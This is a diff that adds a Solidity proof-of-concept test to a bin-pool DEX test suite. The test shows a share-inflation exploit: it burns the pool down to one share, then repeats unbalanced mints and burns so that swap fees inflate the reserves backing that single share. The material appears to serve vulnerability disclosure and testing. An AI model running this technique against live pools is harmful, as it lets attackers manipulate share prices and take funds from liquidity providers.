@@ -1183,6 +1183,126 @@ contract BinPoolManagerTest is Test, GasSnapshot, BinTestHelper {
         assertEq(shares, liquidity);
     }
 
+    function test_poc() public {
+        // key = PoolKey({
+        //     currency0: currency0,
+        //     currency1: currency1,
+        //     hooks: IHooks(address(0)),
+        //     poolManager: IPoolManager(address(poolManager)),
+        //     fee: uint24(3000), // 3000 = 0.3%
+        //     parameters: poolParam.setBinStep(10) // binStep
+        // });
+        poolManager.initialize(key, activeId);
+
+        token0.mint(address(this), 100 ether);
+        token1.mint(address(this), 100 ether);
+
+        // step1: mint and burn to make the pool exact 1 share left
+
+        // step 1.1 mint with 1 eth of token0, 1 eth of token1
+        IBinPoolManager.MintParams memory mintParams = _getSingleBinMintParams(activeId, 1 ether, 1 ether);
+        binLiquidityHelper.mint(key, mintParams, "");
+
+        // step 1.2 burn all - 1  to make the share supply exact 1
+        uint256[] memory ids = new uint256[](1);
+        ids[0] = activeId;
+        uint256[] memory amountsToBurn = new uint256[](1);
+        BinPosition.Info memory position =
+            poolManager.getPosition(key.toId(), address(binLiquidityHelper), activeId, mintParams.salt);
+        amountsToBurn[0] = position.share - 1;
+
+        IBinPoolManager.BurnParams memory burnParams =
+            IBinPoolManager.BurnParams({ids: ids, amountsToBurn: amountsToBurn, salt: mintParams.salt});
+        binLiquidityHelper.burn(key, burnParams, "");
+
+        position = poolManager.getPosition(key.toId(), address(binLiquidityHelper), activeId, mintParams.salt);
+
+        // setp 1.3 verify the share supply is 1
+        // from print result we know that the reserve (token amount) of the pool is also 1
+        // i.e.
+        // Reserve: (1e0, 1e0)
+        // Total (share) supply: 1e0
+        assertEq(position.share, 1);
+        console.log("----- After step1: ------");
+        _printBin(key.toId());
+
+        // step2: inflate the share through mint with unbalanced amount (i.e. trigger inner swap)
+
+        // step 2.1 mint with 5 eth of token0, 0 eth of token1 (unbalanced)
+        // step 2.2 mint with 0 eth of token0, 5 eth of token1 (unbalanced)
+        // since current price of the pool is 1:1, inner swap will be triggered
+        // so that there will be some swap fee generated and be distributed to the original liquidity positions
+        bytes32[] memory liquidityConfigurations2 = new bytes32[](2);
+        liquidityConfigurations2[0] = bytes32(abi.encodePacked(bytes13(0), uint64(1e18), uint64(0), activeId));
+        liquidityConfigurations2[1] = bytes32(abi.encodePacked(bytes13(0), uint64(0), uint64(1e18), activeId));
+
+        IBinPoolManager.MintParams memory mintParams2 = IBinPoolManager.MintParams(
+            liquidityConfigurations2, bytes32(abi.encodePacked(uint128(1e18), uint128(1e18))), mintParams.salt
+        );
+        IBinPoolManager.BurnParams memory burnParams2 =
+            IBinPoolManager.BurnParams({ids: ids, amountsToBurn: amountsToBurn, salt: mintParams.salt});
+
+        BinPool.MintArrays memory mintArray;
+        (, mintArray) = binLiquidityHelper.mint(key, mintParams2, "");
+
+        // step 2.3 withdraw all the liquidity we just added
+        // after this the share supply should be 1 again but the reserve is doubled because of the swap fee
+        // in this way you see the share has actually been inflated to 2x of the original
+        burnParams2.amountsToBurn[0] = mintArray.liquidityMinted[0] + mintArray.liquidityMinted[1];
+        binLiquidityHelper.burn(key, burnParams2, "");
+
+        //   Reserve: (2e0, 2e0)
+        //   Total (share) supply: 1e0
+        // _printBin(key.toId());
+
+        // setp 2.4 if we repeat the operation, the share could be inflated into a large number
+        for (uint256 i = 0; i < 175; ++i) {
+            (, mintArray) = binLiquidityHelper.mint(key, mintParams2, "");
+            burnParams2.amountsToBurn[0] = mintArray.liquidityMinted[0] + mintArray.liquidityMinted[1];
+            binLiquidityHelper.burn(key, burnParams2, "");
+        }
+
+        // we've just inflated the share 100x !
+        //  Reserve: (1.02e2, 1.02e2)
+        //  Total (share) supply: 1e0
+        console.log("----- After step2: ------");
+        _printBin(key.toId());
+
+        // step 3 repeat step2 with adjusted ratio so that inner swap will always happen
+        bytes32[] memory liquidityConfigurations3 = new bytes32[](2);
+        liquidityConfigurations3[0] = bytes32(abi.encodePacked(bytes13(0), uint64(0), uint64(0.8e18), activeId));
+        liquidityConfigurations3[1] = bytes32(abi.encodePacked(bytes13(0), uint64(1e18), uint64(0.2e18), activeId));
+
+        IBinPoolManager.MintParams memory mintParams3 = IBinPoolManager.MintParams(
+            liquidityConfigurations3, bytes32(abi.encodePacked(uint128(0), uint128(0))), mintParams.salt
+        );
+
+        IBinPoolManager.BurnParams memory burnParams3 =
+            IBinPoolManager.BurnParams({ids: ids, amountsToBurn: amountsToBurn, salt: mintParams.salt});
+
+        for (uint256 i; i < 57; i++) {
+            (uint128 binReserveX, uint128 binReserveY,,) = poolManager.getBin(key.toId(), activeId);
+            mintParams3.amountIn = bytes32(abi.encodePacked(uint128(binReserveX * 5), uint128(binReserveY * 5)));
+
+            (, mintArray) = binLiquidityHelper.mint(key, mintParams3, bytes(""));
+
+            burnParams3.amountsToBurn[0] = mintArray.liquidityMinted[0] + mintArray.liquidityMinted[1];
+            binLiquidityHelper.burn(key, burnParams3, "");
+        }
+
+        console.log("----- After step3: ------");
+        _printBin(key.toId());
+    }
+
+    function _printBin(PoolId id) private view {
+        (uint128 binReserveX, uint128 binReserveY, uint256 binLiquidity, uint256 totalShares) =
+            poolManager.getBin(id, activeId);
+
+        console.log("Reserve: (%e, %e)", binReserveX, binReserveY);
+
+        console.log("Total (share) supply: %e", totalShares);
+    }
+
     receive() external payable {}
 
     function supportsInterface(bytes4) external pure returns (bool) {
